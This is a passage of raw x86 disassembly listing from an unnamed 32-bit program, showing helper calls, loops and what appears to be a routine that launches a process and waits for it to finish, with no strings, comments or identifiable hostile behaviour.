  40182f:	52                   	push   %edx
  401830:	e8 2b c4 00 00       	call   0x40dc60
  401835:	ba 60 60 41 00       	mov    $0x416060,%edx
  40183a:	52                   	push   %edx
  40183b:	e8 20 c4 00 00       	call   0x40dc60
  401840:	8d 05 68 70 41 00    	lea    0x417068,%eax
  401846:	50                   	push   %eax
  401847:	e8 b4 c2 00 00       	call   0x40db00
  40184c:	e9 bd 00 00 00       	jmp    0x40190e
  401851:	52                   	push   %edx
  401852:	e8 69 c2 00 00       	call   0x40dac0
  401857:	5a                   	pop    %edx
  401858:	50                   	push   %eax
  401859:	52                   	push   %edx
  40185a:	e8 61 c2 00 00       	call   0x40dac0
  40185f:	5a                   	pop    %edx
  401860:	50                   	push   %eax
  401861:	b8 32 60 41 00       	mov    $0x416032,%eax
  401866:	50                   	push   %eax
  401867:	ff 74 24 1c          	push   0x1c(%esp)
  40186b:	e8 d0 44 00 00       	call   0x405d40
  401870:	8d 44 24 14          	lea    0x14(%esp),%eax
  401874:	50                   	push   %eax
  401875:	e8 86 c2 00 00       	call   0x40db00
  40187a:	8b 54 24 10          	mov    0x10(%esp),%edx
  40187e:	52                   	push   %edx
  40187f:	e8 3c c2 00 00       	call   0x40dac0
  401884:	5a                   	pop    %edx
  401885:	50                   	push   %eax
  401886:	52                   	push   %edx
  401887:	e8 d4 c3 00 00       	call   0x40dc60
  40188c:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401890:	8b 2d 70 70 41 00    	mov    0x417070,%ebp
  401896:	6b db 0c             	imul   $0xc,%ebx,%ebx
  401899:	01 dd                	add    %ebx,%ebp
  40189b:	8d 45 04             	lea    0x4(%ebp),%eax
  40189e:	50                   	push   %eax
  40189f:	e8 5c c2 00 00       	call   0x40db00
  4018a4:	ff 74 24 24          	push   0x24(%esp)
  4018a8:	e8 d3 40 00 00       	call   0x405980
  4018ad:	50                   	push   %eax
  4018ae:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  4018b2:	8b 2d 70 70 41 00    	mov    0x417070,%ebp
  4018b8:	6b db 0c             	imul   $0xc,%ebx,%ebx
  4018bb:	01 dd                	add    %ebx,%ebp
  4018bd:	58                   	pop    %eax
  4018be:	89 45 00             	mov    %eax,0x0(%ebp)
  4018c1:	8b 15 68 70 41 00    	mov    0x417068,%edx
  4018c7:	52                   	push   %edx
  4018c8:	e8 f3 c1 00 00       	call   0x40dac0
  4018cd:	5a                   	pop    %edx
  4018ce:	50                   	push   %eax
  4018cf:	52                   	push   %edx
  4018d0:	e8 8b c3 00 00       	call   0x40dc60
  4018d5:	8b 15 24 70 41 00    	mov    0x417024,%edx
  4018db:	52                   	push   %edx
  4018dc:	e8 7f c3 00 00       	call   0x40dc60
  4018e1:	8b 15 3c 70 41 00    	mov    0x41703c,%edx
  4018e7:	52                   	push   %edx
  4018e8:	e8 73 c3 00 00       	call   0x40dc60
  4018ed:	8b 54 24 14          	mov    0x14(%esp),%edx
  4018f1:	52                   	push   %edx
  4018f2:	e8 69 c3 00 00       	call   0x40dc60
  4018f7:	ba 60 60 41 00       	mov    $0x416060,%edx
  4018fc:	52                   	push   %edx
  4018fd:	e8 5e c3 00 00       	call   0x40dc60
  401902:	8d 05 68 70 41 00    	lea    0x417068,%eax
  401908:	50                   	push   %eax
  401909:	e8 f2 c1 00 00       	call   0x40db00
  40190e:	eb 02                	jmp    0x401912
  401910:	eb 0e                	jmp    0x401920
  401912:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  401916:	43                   	inc    %ebx
  401917:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
  40191b:	e9 4c fd ff ff       	jmp    0x40166c
  401920:	8b 44 24 04          	mov    0x4(%esp),%eax
  401924:	eb 02                	jmp    0x401928
  401926:	31 c0                	xor    %eax,%eax
  401928:	ff 74 24 08          	push   0x8(%esp)
  40192c:	e8 5f c2 00 00       	call   0x40db90
  401931:	ff 74 24 28          	push   0x28(%esp)
  401935:	e8 56 c2 00 00       	call   0x40db90
  40193a:	ff 74 24 10          	push   0x10(%esp)
  40193e:	e8 4d c2 00 00       	call   0x40db90
  401943:	ff 74 24 24          	push   0x24(%esp)
  401947:	e8 44 c2 00 00       	call   0x40db90
  40194c:	ff 74 24 0c          	push   0xc(%esp)
  401950:	e8 3b c2 00 00       	call   0x40db90
  401955:	83 c4 2c             	add    $0x2c,%esp
  401958:	5b                   	pop    %ebx
  401959:	5d                   	pop    %ebp
  40195a:	c3                   	ret
  40195b:	55                   	push   %ebp
  40195c:	53                   	push   %ebx
  40195d:	31 c0                	xor    %eax,%eax
  40195f:	50                   	push   %eax
  401960:	50                   	push   %eax
  401961:	50                   	push   %eax
  401962:	50                   	push   %eax
  401963:	50                   	push   %eax
  401964:	50                   	push   %eax
  401965:	e8 96 c2 00 00       	call   0x40dc00
  40196a:	52                   	push   %edx
  40196b:	e8 50 c1 00 00       	call   0x40dac0
  401970:	5a                   	pop    %edx
  401971:	50                   	push   %eax
  401972:	68 02 00 00 00       	push   $0x2
  401977:	68 00 00 00 00       	push   $0x0
  40197c:	52                   	push   %edx
  40197d:	e8 3e c1 00 00       	call   0x40dac0
  401982:	5a                   	pop    %edx
  401983:	50                   	push   %eax
  401984:	52                   	push   %edx
  401985:	e8 36 c1 00 00       	call   0x40dac0
  40198a:	5a                   	pop    %edx
  40198b:	50                   	push   %eax
  40198c:	e8 47 79 00 00       	call   0x4092d8
  401991:	e8 ec 37 00 00       	call   0x405182
  401996:	01 14 24             	add    %edx,(%esp)
  401999:	e8 fc 36 00 00       	call   0x40509a
  40199e:	e8 fd 37 00 00       	call   0x4051a0
  4019a3:	89 04 24             	mov    %eax,(%esp)
  4019a6:	68 00 00 00 00       	push   $0x0
  4019ab:	8d 05 bf 1e 40 00    	lea    0x401ebf,%eax
  4019b1:	50                   	push   %eax
  4019b2:	ff 74 24 08          	push   0x8(%esp)
  4019b6:	e8 e5 36 00 00       	call   0x4050a0
  4019bb:	ff 34 24             	push   (%esp)
  4019be:	e8 e3 36 00 00       	call   0x4050a6
  4019c3:	ff 35 88 70 41 00    	push   0x417088
  4019c9:	e8 b5 86 00 00       	call   0x40a083
  4019ce:	89 c3                	mov    %eax,%ebx
  4019d0:	21 db                	and    %ebx,%ebx
  4019d2:	0f 8e 0f 02 00 00    	jle    0x401be7
  4019d8:	ff 35 88 70 41 00    	push   0x417088
  4019de:	e8 aa 86 00 00       	call   0x40a08d
  4019e3:	ff 35 88 70 41 00    	push   0x417088
  4019e9:	e8 b4 86 00 00       	call   0x40a0a2
  4019ee:	09 c0                	or     %eax,%eax
  4019f0:	74 7a                	je     0x401a6c
  4019f2:	8b 2d 8c 70 41 00    	mov    0x41708c,%ebp
  4019f8:	8b 55 08             	mov    0x8(%ebp),%edx
  4019fb:	52                   	push   %edx
  4019fc:	e8 bf c0 00 00       	call   0x40dac0
  401a01:	5a                   	pop    %edx
  401a02:	50                   	push   %eax
  401a03:	52                   	push   %edx
  401a04:	e8 57 c2 00 00       	call   0x40dc60
  401a09:	8d 44 24 08          	lea    0x8(%esp),%eax
  401a0d:	50                   	push   %eax
  401a0e:	e8 ed c0 00 00       	call   0x40db00
  401a13:	ff 74 24 04          	push   0x4(%esp)
  401a17:	e8 44 43 00 00       	call   0x405d60
  401a1c:	89 c3                	mov    %eax,%ebx
  401a1e:	83 fb 0a             	cmp    $0xa,%ebx
  401a21:	7e 28                	jle    0x401a4b
  401a23:	8b 54 24 08          	mov    0x8(%esp),%edx
  401a27:	52                   	push   %edx
  401a28:	e8 93 c0 00 00       	call   0x40dac0
  401a2d:	5a                   	pop    %edx
  401a2e:	50                   	push   %eax
  401a2f:	52                   	push   %edx
  401a30:	e8 2b c2 00 00       	call   0x40dc60
  401a35:	8b 54 24 08          	mov    0x8(%esp),%edx
  401a39:	52                   	push   %edx
  401a3a:	e8 21 c2 00 00       	call   0x40dc60
  401a3f:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401a43:	50                   	push   %eax
  401a44:	e8 b7 c0 00 00       	call   0x40db00
  401a49:	eb 1c                	jmp    0x401a67
  401a4b:	8b 54 24 04          	mov    0x4(%esp),%edx
  401a4f:	52                   	push   %edx
  401a50:	e8 6b c0 00 00       	call   0x40dac0
  401a55:	5a                   	pop    %edx
  401a56:	50                   	push   %eax
  401a57:	52                   	push   %edx
  401a58:	e8 03 c2 00 00       	call   0x40dc60
  401a5d:	8d 44 24 10          	lea    0x10(%esp),%eax
  401a61:	50                   	push   %eax
  401a62:	e8 99 c0 00 00       	call   0x40db00
  401a67:	e9 77 ff ff ff       	jmp    0x4019e3
  401a6c:	ff 35 88 70 41 00    	push   0x417088
  401a72:	e8 5f 86 00 00       	call   0x40a0d6
  401a77:	52                   	push   %edx
  401a78:	e8 43 c0 00 00       	call   0x40dac0
  401a7d:	5a                   	pop    %edx
  401a7e:	50                   	push   %eax
  401a7f:	52                   	push   %edx
  401a80:	e8 3b c0 00 00       	call   0x40dac0
  401a85:	5a                   	pop    %edx
  401a86:	50                   	push   %eax
  401a87:	52                   	push   %edx
  401a88:	e8 33 c0 00 00       	call   0x40dac0
  401a8d:	5a                   	pop    %edx
  401a8e:	50                   	push   %eax
  401a8f:	52                   	push   %edx
  401a90:	e8 2b c0 00 00       	call   0x40dac0
  401a95:	5a                   	pop    %edx
  401a96:	50                   	push   %eax
  401a97:	68 01 00 00 00       	push   $0x1
  401a9c:	52                   	push   %edx
  401a9d:	e8 1e c0 00 00       	call   0x40dac0
  401aa2:	5a                   	pop    %edx
  401aa3:	50                   	push   %eax
  401aa4:	52                   	push   %edx
  401aa5:	e8 16 c0 00 00       	call   0x40dac0
  401aaa:	5a                   	pop    %edx
  401aab:	50                   	push   %eax
  401aac:	ff 74 24 24          	push   0x24(%esp)
  401ab0:	e8 db 42 00 00       	call   0x405d90
  401ab5:	e8 c8 36 00 00       	call   0x405182
  401aba:	01 14 24             	add    %edx,(%esp)
  401abd:	e8 7e b2 00 00       	call   0x40cd40
  401ac2:	e8 bb 36 00 00       	call   0x405182
  401ac7:	01 14 24             	add    %edx,(%esp)
  401aca:	e8 61 43 00 00       	call   0x405e30
  401acf:	8d 44 24 14          	lea    0x14(%esp),%eax
  401ad3:	50                   	push   %eax
  401ad4:	e8 27 c0 00 00       	call   0x40db00
  401ad9:	8b 54 24 10          	mov    0x10(%esp),%edx
  401add:	52                   	push   %edx
  401ade:	e8 dd bf 00 00       	call   0x40dac0
  401ae3:	5a                   	pop    %edx
  401ae4:	50                   	push   %eax
  401ae5:	52                   	push   %edx
  401ae6:	e8 75 c1 00 00       	call   0x40dc60
  401aeb:	8d 44 24 18          	lea    0x18(%esp),%eax
  401aef:	50                   	push   %eax
  401af0:	e8 0b c0 00 00       	call   0x40db00
  401af5:	52                   	push   %edx
  401af6:	e8 c5 bf 00 00       	call   0x40dac0
  401afb:	5a                   	pop    %edx
  401afc:	50                   	push   %eax
  401afd:	52                   	push   %edx
  401afe:	e8 bd bf 00 00       	call   0x40dac0
  401b03:	5a                   	pop    %edx
  401b04:	50                   	push   %eax
  401b05:	52                   	push   %edx
  401b06:	e8 b5 bf 00 00       	call   0x40dac0
  401b0b:	5a                   	pop    %edx
  401b0c:	50                   	push   %eax
  401b0d:	52                   	push   %edx
  401b0e:	e8 ad bf 00 00       	call   0x40dac0
  401b13:	5a                   	pop    %edx
  401b14:	50                   	push   %eax
  401b15:	68 01 00 00 00       	push   $0x1
  401b1a:	ff 74 24 24          	push   0x24(%esp)
  401b1e:	e8 1d b2 00 00       	call   0x40cd40
  401b23:	e8 5a 36 00 00       	call   0x405182
  401b28:	01 14 24             	add    %edx,(%esp)
  401b2b:	e8 00 43 00 00       	call   0x405e30
  401b30:	8d 44 24 14          	lea    0x14(%esp),%eax
  401b34:	50                   	push   %eax
  401b35:	e8 c6 bf 00 00       	call   0x40db00
  401b3a:	52                   	push   %edx
  401b3b:	e8 80 bf 00 00       	call   0x40dac0
  401b40:	5a                   	pop    %edx
  401b41:	50                   	push   %eax
  401b42:	52                   	push   %edx
  401b43:	e8 78 bf 00 00       	call   0x40dac0
  401b48:	5a                   	pop    %edx
  401b49:	50                   	push   %eax
  401b4a:	68 0a 00 00 00       	push   $0xa
  401b4f:	ff 74 24 1c          	push   0x1c(%esp)
  401b53:	e8 48 43 00 00       	call   0x405ea0
  401b58:	8d 44 24 14          	lea    0x14(%esp),%eax
  401b5c:	50                   	push   %eax
  401b5d:	e8 9e bf 00 00       	call   0x40db00
  401b62:	ff 74 24 0c          	push   0xc(%esp)
  401b66:	8b 54 24 14          	mov    0x14(%esp),%edx
  401b6a:	59                   	pop    %ecx
  401b6b:	e8 b0 35 00 00       	call   0x405120
  401b70:	74 70                	je     0x401be2
  401b72:	e8 27 79 00 00       	call   0x40949e
  401b77:	21 c0                	and    %eax,%eax
  401b79:	74 63                	je     0x401bde
  401b7b:	52                   	push   %edx
  401b7c:	e8 3f bf 00 00       	call   0x40dac0
  401b81:	5a                   	pop    %edx
  401b82:	50                   	push   %eax
  401b83:	52                   	push   %edx
  401b84:	e8 37 bf 00 00       	call   0x40dac0
  401b89:	5a                   	pop    %edx
  401b8a:	50                   	push   %eax
  401b8b:	68 00 00 00 00       	push   $0x0
  401b90:	e8 1d 79 00 00       	call   0x4094b2
  401b95:	e8 26 c1 00 00       	call   0x40dcc0
  401b9a:	8b 54 24 18          	mov    0x18(%esp),%edx
  401b9e:	59                   	pop    %ecx
  401b9f:	51                   	push   %ecx
  401ba0:	e8 bb 35 00 00       	call   0x405160
  401ba5:	89 c1                	mov    %eax,%ecx
  401ba7:	e8 74 35 00 00       	call   0x405120
  401bac:	74 30                	je     0x401bde
  401bae:	c7 05 2c 70 41 00 01 	movl   $0x1,0x41702c
  401bb5:	00 00 00 
  401bb8:	52                   	push   %edx
  401bb9:	e8 02 bf 00 00       	call   0x40dac0
  401bbe:	5a                   	pop    %edx
  401bbf:	50                   	push   %eax
  401bc0:	52                   	push   %edx
  401bc1:	e8 fa be 00 00       	call   0x40dac0
  401bc6:	5a                   	pop    %edx
  401bc7:	50                   	push   %eax
  401bc8:	68 01 00 00 00       	push   $0x1
  401bcd:	e8 e0 78 00 00       	call   0x4094b2
  401bd2:	8d 05 04 70 41 00    	lea    0x417004,%eax
  401bd8:	50                   	push   %eax
  401bd9:	e8 22 bf 00 00       	call   0x40db00
  401bde:	eb 0e                	jmp    0x401bee
  401be0:	eb 05                	jmp    0x401be7
  401be2:	e9 b9 f5 ff ff       	jmp    0x4011a0
  401be7:	e9 b4 f5 ff ff       	jmp    0x4011a0
  401bec:	31 c0                	xor    %eax,%eax
  401bee:	ff 74 24 04          	push   0x4(%esp)
  401bf2:	e8 99 bf 00 00       	call   0x40db90
  401bf7:	ff 74 24 0c          	push   0xc(%esp)
  401bfb:	e8 90 bf 00 00       	call   0x40db90
  401c00:	ff 74 24 08          	push   0x8(%esp)
  401c04:	e8 87 bf 00 00       	call   0x40db90
  401c09:	ff 74 24 14          	push   0x14(%esp)
  401c0d:	e8 7e bf 00 00       	call   0x40db90
  401c12:	ff 74 24 10          	push   0x10(%esp)
  401c16:	e8 75 bf 00 00       	call   0x40db90
  401c1b:	83 c4 18             	add    $0x18,%esp
  401c1e:	5b                   	pop    %ebx
  401c1f:	5d                   	pop    %ebp
  401c20:	c3                   	ret
  401c21:	53                   	push   %ebx
  401c22:	31 c0                	xor    %eax,%eax
  401c24:	50                   	push   %eax
  401c25:	e8 d6 bf 00 00       	call   0x40dc00
  401c2a:	ff 74 24 10          	push   0x10(%esp)
  401c2e:	e8 6d 35 00 00       	call   0x4051a0
  401c33:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  401c37:	21 db                	and    %ebx,%ebx
  401c39:	7e 17                	jle    0x401c52
  401c3b:	52                   	push   %edx
  401c3c:	e8 7f be 00 00       	call   0x40dac0
  401c41:	5a                   	pop    %edx
  401c42:	50                   	push   %eax
  401c43:	e8 53 09 00 00       	call   0x40259b
  401c48:	8d 44 24 04          	lea    0x4(%esp),%eax
  401c4c:	50                   	push   %eax
  401c4d:	e8 ae be 00 00       	call   0x40db00
  401c52:	8b 14 24             	mov    (%esp),%edx
  401c55:	52                   	push   %edx
  401c56:	e8 65 be 00 00       	call   0x40dac0
  401c5b:	5a                   	pop    %edx
  401c5c:	50                   	push   %eax
  401c5d:	52                   	push   %edx
  401c5e:	e8 fd bf 00 00       	call   0x40dc60
  401c63:	58                   	pop    %eax
  401c64:	50                   	push   %eax
  401c65:	e8 06 35 00 00       	call   0x405170
  401c6a:	5a                   	pop    %edx
  401c6b:	01 d0                	add    %edx,%eax
  401c6d:	eb 0a                	jmp    0x401c79
  401c6f:	e8 7c c0 00 00       	call   0x40dcf0
  401c74:	66 c7 00 00 00       	movw   $0x0,(%eax)
  401c79:	ff 34 24             	push   (%esp)
  401c7c:	e8 0f bf 00 00       	call   0x40db90
  401c81:	83 c4 04             	add    $0x4,%esp
  401c84:	5b                   	pop    %ebx
  401c85:	c2 04 00             	ret    $0x4
  401c88:	31 c0                	xor    %eax,%eax
  401c8a:	50                   	push   %eax
  401c8b:	e8 70 bf 00 00       	call   0x40dc00
  401c90:	52                   	push   %edx
  401c91:	e8 2a be 00 00       	call   0x40dac0
  401c96:	5a                   	pop    %edx
  401c97:	50                   	push   %eax
  401c98:	68 10 00 00 00       	push   $0x10
  401c9d:	8b 54 24 08          	mov    0x8(%esp),%edx
  401ca1:	52                   	push   %edx
  401ca2:	e8 19 be 00 00       	call   0x40dac0
  401ca7:	5a                   	pop    %edx
  401ca8:	50                   	push   %eax
  401ca9:	52                   	push   %edx
  401caa:	e8 b1 bf 00 00       	call   0x40dc60
  401caf:	52                   	push   %edx
  401cb0:	e8 0b be 00 00       	call   0x40dac0
  401cb5:	5a                   	pop    %edx
  401cb6:	50                   	push   %eax
  401cb7:	52                   	push   %edx
  401cb8:	e8 03 be 00 00       	call   0x40dac0
  401cbd:	5a                   	pop    %edx
  401cbe:	50                   	push   %eax
  401cbf:	e8 8c 7a 00 00       	call   0x409750
  401cc4:	58                   	pop    %eax
  401cc5:	e8 f6 bf 00 00       	call   0x40dcc0
  401cca:	b8 20 60 41 00       	mov    $0x416020,%eax
  401ccf:	50                   	push   %eax
  401cd0:	e8 ad 34 00 00       	call   0x405182
  401cd5:	01 54 24 04          	add    %edx,0x4(%esp)
  401cd9:	e8 89 6d 00 00       	call   0x408a67
  401cde:	e8 bd 34 00 00       	call   0x4051a0
  401ce3:	e9 b8 f4 ff ff       	jmp    0x4011a0
  401ce8:	31 c0                	xor    %eax,%eax
  401cea:	ff 34 24             	push   (%esp)
  401ced:	e8 9e be 00 00       	call   0x40db90
  401cf2:	83 c4 04             	add    $0x4,%esp
  401cf5:	c3                   	ret
  401cf6:	53                   	push   %ebx
  401cf7:	31 c0                	xor    %eax,%eax
  401cf9:	50                   	push   %eax
  401cfa:	e8 01 bf 00 00       	call   0x40dc00
  401cff:	8b 1c 24             	mov    (%esp),%ebx
  401d02:	83 fb 01             	cmp    $0x1,%ebx
  401d05:	75 1a                	jne    0x401d21
  401d07:	ff 35 f4 6f 41 00    	push   0x416ff4
  401d0d:	e8 af 36 00 00       	call   0x4053c1
  401d12:	21 c0                	and    %eax,%eax
  401d14:	74 0b                	je     0x401d21
  401d16:	ff 35 f4 6f 41 00    	push   0x416ff4
  401d1c:	e8 0f 37 00 00       	call   0x405430
  401d21:	e8 36 19 00 00       	call   0x40365c
  401d26:	ff 35 40 70 41 00    	push   0x417040
  401d2c:	e8 93 86 00 00       	call   0x40a3c4
  401d31:	ff 35 60 70 41 00    	push   0x417060
  401d37:	e8 70 33 00 00       	call   0x4050ac
  401d3c:	ff 35 48 70 41 00    	push   0x417048
  401d42:	e8 65 33 00 00       	call   0x4050ac
  401d47:	ff 74 24 0c          	push   0xc(%esp)
  401d4b:	e9 55 f4 ff ff       	jmp    0x4011a5
  401d50:	31 c0                	xor    %eax,%eax
  401d52:	83 c4 04             	add    $0x4,%esp
  401d55:	5b                   	pop    %ebx
  401d56:	c2 04 00             	ret    $0x4
  401d59:	55                   	push   %ebp
  401d5a:	53                   	push   %ebx
  401d5b:	ba 16 00 00 00       	mov    $0x16,%edx
  401d60:	83 ec 04             	sub    $0x4,%esp
  401d63:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401d6a:	4a                   	dec    %edx
  401d6b:	75 f3                	jne    0x401d60
  401d6d:	e8 8e be 00 00       	call   0x40dc00
  401d72:	8b 54 24 64          	mov    0x64(%esp),%edx
  401d76:	8d 0c 24             	lea    (%esp),%ecx
  401d79:	e8 e2 32 00 00       	call   0x405060
  401d7e:	8b 54 24 68          	mov    0x68(%esp),%edx
  401d82:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401d86:	e8 d5 32 00 00       	call   0x405060
  401d8b:	8b 54 24 6c          	mov    0x6c(%esp),%edx
  401d8f:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401d93:	e8 c8 32 00 00       	call   0x405060
  401d98:	8b 15 40 70 41 00    	mov    0x417040,%edx
  401d9e:	52                   	push   %edx
  401d9f:	e8 1c bd 00 00       	call   0x40dac0
  401da4:	5a                   	pop    %edx
  401da5:	50                   	push   %eax
  401da6:	52                   	push   %edx
  401da7:	e8 b4 be 00 00       	call   0x40dc60
  401dac:	8d 44 24 10          	lea    0x10(%esp),%eax
  401db0:	50                   	push   %eax
  401db1:	e8 4a bd 00 00       	call   0x40db00
  401db6:	ff 74 24 0c          	push   0xc(%esp)
  401dba:	e8 96 35 00 00       	call   0x405355
  401dbf:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401dc3:	52                   	push   %edx
  401dc4:	e8 f7 bc 00 00       	call   0x40dac0
  401dc9:	5a                   	pop    %edx
  401dca:	50                   	push   %eax
  401dcb:	52                   	push   %edx
  401dcc:	e8 8f be 00 00       	call   0x40dc60
  401dd1:	ba 26 60 41 00       	mov    $0x416026,%edx
  401dd6:	52                   	push   %edx
  401dd7:	e8 84 be 00 00       	call   0x40dc60
  401ddc:	8b 54 24 14          	mov    0x14(%esp),%edx
  401de0:	52                   	push   %edx
  401de1:	e8 7a be 00 00       	call   0x40dc60
  401de6:	ba 26 60 41 00       	mov    $0x416026,%edx
  401deb:	52                   	push   %edx
  401dec:	e8 6f be 00 00       	call   0x40dc60
  401df1:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401df5:	52                   	push   %edx
  401df6:	e8 65 be 00 00       	call   0x40dc60
  401dfb:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401dff:	50                   	push   %eax
  401e00:	e8 fb bc 00 00       	call   0x40db00
  401e05:	8d 44 24 14          	lea    0x14(%esp),%eax
  401e09:	8d 6c 24 14          	lea    0x14(%esp),%ebp
  401e0d:	c7 45 00 3c 00 00 00 	movl   $0x3c,0x0(%ebp)
  401e14:	c7 45 04 40 01 00 00 	movl   $0x140,0x4(%ebp)
  401e1b:	c7 45 1c 00 00 00 00 	movl   $0x0,0x1c(%ebp)
  401e22:	b8 42 60 41 00       	mov    $0x416042,%eax
  401e27:	50                   	push   %eax
  401e28:	58                   	pop    %eax
  401e29:	89 45 0c             	mov    %eax,0xc(%ebp)
  401e2c:	8b 04 24             	mov    (%esp),%eax
  401e2f:	50                   	push   %eax
  401e30:	58                   	pop    %eax
  401e31:	89 45 10             	mov    %eax,0x10(%ebp)
  401e34:	8b 44 24 08          	mov    0x8(%esp),%eax
  401e38:	50                   	push   %eax
  401e39:	58                   	pop    %eax
  401e3a:	89 45 14             	mov    %eax,0x14(%ebp)
  401e3d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401e41:	50                   	push   %eax
  401e42:	58                   	pop    %eax
  401e43:	89 45 18             	mov    %eax,0x18(%ebp)
  401e46:	8d 44 24 14          	lea    0x14(%esp),%eax
  401e4a:	50                   	push   %eax
  401e4b:	e8 ff 34 00 00       	call   0x40534f
  401e50:	89 44 24 50          	mov    %eax,0x50(%esp)
  401e54:	68 19 00 00 00       	push   $0x19
  401e59:	e8 ce 36 00 00       	call   0x40552c
  401e5e:	8d 44 24 54          	lea    0x54(%esp),%eax
  401e62:	50                   	push   %eax
  401e63:	8d 6c 24 18          	lea    0x18(%esp),%ebp
  401e67:	ff 75 38             	push   0x38(%ebp)
  401e6a:	e8 43 32 00 00       	call   0x4050b2
  401e6f:	21 c0                	and    %eax,%eax
  401e71:	74 0e                	je     0x401e81
  401e73:	8b 5c 24 54          	mov    0x54(%esp),%ebx
  401e77:	81 fb 03 01 00 00    	cmp    $0x103,%ebx
  401e7d:	74 02                	je     0x401e81
  401e7f:	eb 02                	jmp    0x401e83
  401e81:	eb d1                	jmp    0x401e54
  401e83:	8b 44 24 54          	mov    0x54(%esp),%eax
  401e87:	eb 02                	jmp    0x401e8b
  401e89:	31 c0                	xor    %eax,%eax
  401e8b:	ff 74 24 10          	push   0x10(%esp)
  401e8f:	e8 fc bc 00 00       	call   0x40db90
  401e94:	ff 34 24             	push   (%esp)
  401e97:	e8 f4 bc 00 00       	call   0x40db90
  401e9c:	ff 74 24 04          	push   0x4(%esp)
  401ea0:	e8 eb bc 00 00       	call   0x40db90
  401ea5:	ff 74 24 0c          	push   0xc(%esp)
  401ea9:	e8 e2 bc 00 00       	call   0x40db90
  401eae:	ff 74 24 08          	push   0x8(%esp)
  401eb2:	e8 d9 bc 00 00       	call   0x40db90
  401eb7:	83 c4 58             	add    $0x58,%esp
  401eba:	5b                   	pop    %ebx
  401ebb:	5d                   	pop    %ebp
  401ebc:	c2 0c 00             	ret    $0xc
  401ebf:	53                   	push   %ebx
  401ec0:	e8 3b bd 00 00       	call   0x40dc00
  401ec5:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  401ec9:	83 fb 0a             	cmp    $0xa,%ebx
  401ecc:	75 19                	jne    0x401ee7
  401ece:	68 00 00 00 00       	push   $0x0
  401ed3:	8d 05 6b 31 40 00    	lea    0x40316b,%eax
  401ed9:	50                   	push   %eax
  401eda:	ff 74 24 14          	push   0x14(%esp)
  401ede:	ff 74 24 14          	push   0x14(%esp)
  401ee2:	e8 d1 31 00 00       	call   0x4050b8
  401ee7:	b8 01 00 00 00       	mov    $0x1,%eax
  401eec:	eb 02                	jmp    0x401ef0
  401eee:	31 c0                	xor    %eax,%eax
  401ef0:	5b                   	pop    %ebx
  401ef1:	c2 0c 00             	ret    $0xc
  401ef4:	53                   	push   %ebx
  401ef5:	31 c0                	xor    %eax,%eax
  401ef7:	50                   	push   %eax
  401ef8:	50                   	push   %eax
  401ef9:	50                   	push   %eax
  401efa:	50                   	push   %eax
  401efb:	50                   	push   %eax
  401efc:	50                   	push   %eax
  401efd:	e8 fe bc 00 00       	call   0x40dc00
  401f02:	b8 04 61 41 00       	mov    $0x416104,%eax
  401f07:	a3 0c 70 41 00       	mov    %eax,0x41700c
  401f0c:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  401f13:	eb 00                	jmp    0x401f15
  401f15:	b8 03 00 00 00       	mov    $0x3,%eax
  401f1a:	3b 04 24             	cmp    (%esp),%eax
  401f1d:	7c 64                	jl     0x401f83
  401f1f:	a1 0c 70 41 00       	mov    0x41700c,%eax
  401f24:	0f be 00             	movsbl (%eax),%eax
  401f27:	89 44 24 04          	mov    %eax,0x4(%esp)
  401f2b:	ff 05 0c 70 41 00    	incl   0x41700c
  401f31:	52                   	push   %edx
  401f32:	e8 89 bb 00 00       	call   0x40dac0
  401f37:	5a                   	pop    %edx
  401f38:	50                   	push   %eax
  401f39:	52                   	push   %edx
  401f3a:	e8 81 bb 00 00       	call   0x40dac0
  401f3f:	5a                   	pop    %edx
  401f40:	50                   	push   %eax
  401f41:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  401f45:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  401f48:	53                   	push   %ebx
  401f49:	e8 c2 3f 00 00       	call   0x405f10
  401f4e:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401f52:	50                   	push   %eax
  401f53:	e8 a8 bb 00 00       	call   0x40db00
  401f58:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401f5c:	52                   	push   %edx
  401f5d:	e8 5e bb 00 00       	call   0x40dac0
  401f62:	5a                   	pop    %edx
  401f63:	50                   	push   %eax
  401f64:	52                   	push   %edx
  401f65:	e8 f6 bc 00 00       	call   0x40dc60
  401f6a:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401f6e:	52                   	push   %edx
  401f6f:	e8 ec bc 00 00       	call   0x40dc60
  401f74:	8d 44 24 10          	lea    0x10(%esp),%eax
  401f78:	50                   	push   %eax
  401f79:	e8 82 bb 00 00       	call   0x40db00
  401f7e:	ff 04 24             	incl   (%esp)
  401f81:	71 92                	jno    0x401f15
  401f83:	68 00 04 00 00       	push   $0x400
  401f88:	e8 53 78 00 00       	call   0x4097e0
  401f8d:	89 44 24 10          	mov    %eax,0x10(%esp)
  401f91:	52                   	push   %edx
  401f92:	e8 29 bb 00 00       	call   0x40dac0
  401f97:	5a                   	pop    %edx
  401f98:	50                   	push   %eax
  401f99:	52                   	push   %edx
  401f9a:	e8 21 bb 00 00       	call   0x40dac0
  401f9f:	5a                   	pop    %edx
  401fa0:	50                   	push   %eax
  401fa1:	e8 2c 84 00 00       	call   0x40a3d2
  401fa6:	8d 44 24 18          	lea    0x18(%esp),%eax
  401faa:	50                   	push   %eax
  401fab:	e8 50 bb 00 00       	call   0x40db00
  401fb0:	ff 74 24 10          	push   0x10(%esp)
  401fb4:	68 00 00 00 00       	push   $0x0
  401fb9:	b8 20 60 41 00       	mov    $0x416020,%eax
  401fbe:	50                   	push   %eax
  401fbf:	ff 74 24 20          	push   0x20(%esp)
  401fc3:	e8 f6 30 00 00       	call   0x4050be
  401fc8:	52                   	push   %edx
